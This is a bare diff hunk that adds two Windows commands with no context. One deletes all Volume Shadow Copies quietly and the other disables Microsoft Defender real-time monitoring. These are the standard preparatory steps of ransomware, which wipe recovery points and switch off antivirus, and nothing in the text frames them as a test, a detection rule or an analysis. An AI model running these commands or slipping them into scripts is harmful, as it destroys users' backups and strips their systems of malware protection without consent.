@@ -1,0 +1,2 @@
+vssadmin delete shadows /all /quiet
+Set-MpPreference -DisableRealtimeMonitoring $true
